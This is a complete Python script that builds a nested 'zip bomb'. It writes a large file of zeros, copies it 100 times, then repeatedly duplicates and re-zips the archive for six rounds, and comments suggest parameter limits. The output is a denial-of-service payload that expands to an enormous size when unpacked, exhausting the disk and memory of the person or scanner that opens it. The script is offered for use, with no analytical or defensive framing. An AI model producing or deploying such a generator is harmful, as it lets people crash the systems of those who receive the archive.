import os 
import shutil

def making_bomb(n_zeros:int = 20000000, n_copy:int = 100, n_branch:int = 6):
    ##==================
    ##Write a file
    ##==================
    print("Writing file...")

    os.makedirs("bomb")

    with open("bomb/death1.txt", "w") as f:
        f.write("0"*n_zeros)  

    ##==================
    ##Duplicate
    ##==================
    print("Duplicating files...")

    for i in range(2, n_copy+1):  
        shutil.copy("bomb/death1.txt", f"bomb/death{i}.txt")

    ##==================
    ##Zipping files
    ##==================
    print("Zipping files...")
    shutil.make_archive("bomb", "zip", "bomb")
    shutil.rmtree("bomb")

    ##===================================
    ## Duplicating zips
    ##===================================
    print("Duplicating zips, zip them, and repeat...")

    for i in range(n_branch):   
        print("Round", i+1)

        os.makedirs("bomb")
        shutil.move("bomb.zip", "bomb")

        print("Duplicating...")
        for j in range(2, n_copy+1): 
            shutil.copy("bomb/bomb.zip", f"bomb/bomb{j}.zip")

        print("Zipping...")
        shutil.make_archive("bomb", "zip", "bomb")
        shutil.rmtree("bomb")

    print("Done!")

if __name__ == "__main__":
    making_bomb(
        n_zeros = 20000000,  #Recommended limit: less than 500 mil
        n_copy = 100,  #Recommended limit: less than 500
        n_branch = 6  #Recommended limit: 6-7
    )